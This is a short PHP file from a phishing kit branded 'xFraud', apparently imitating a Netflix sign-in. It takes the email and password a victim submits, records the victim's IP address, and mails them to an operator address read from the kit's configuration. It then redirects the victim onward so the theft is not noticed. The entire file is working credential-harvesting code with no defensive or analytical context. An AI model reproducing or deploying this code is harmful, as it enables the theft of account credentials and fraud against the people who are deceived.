<?php
session_start();
//error_reporting(0);
require_once("../../inc/config.inc.php");

$user = $_POST['login_user'];
$pass = $_POST['login_pass'];
$ip = $_SERVER['REMOTE_ADDR'];

$msg = "
* xFraud Says Hello *
* Email : $user
* Password : $pass
";

mail($setting["mail_to"], "xFraud | New NF Account [$ip] *** ", $msg);

$_SESSION['logged_in'] = "true";

header("location: ../account");
?>
